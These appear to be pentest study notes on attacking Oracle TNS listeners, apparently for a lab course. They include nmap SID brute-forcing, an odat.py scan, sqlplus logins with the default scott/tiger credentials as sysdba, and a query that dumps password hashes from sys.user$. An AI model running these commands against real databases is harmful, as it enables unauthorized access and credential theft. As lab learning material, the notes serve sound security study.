---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Oracle TNS

ORACLE\_HOME/network/admin

**Tnsnames.ora**

**Listener.ora**

In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.

nmap

```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

We can use the `odat.py` tool to perform a variety of scans to enumerate

```
./odat.py all -s 10.129.204.235
```

**SQLplus - Log In**

{% code overflow="wrap" fullWidth="true" %}
```
sqlplus scott/tiger@10.129.204.235/XE;
sqlplus scott/tiger@10.129.204.235/XE as sysdba

#gdy sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

select table_name from all_tables;

select name, password from sys.user$;
```
{% endcode %}
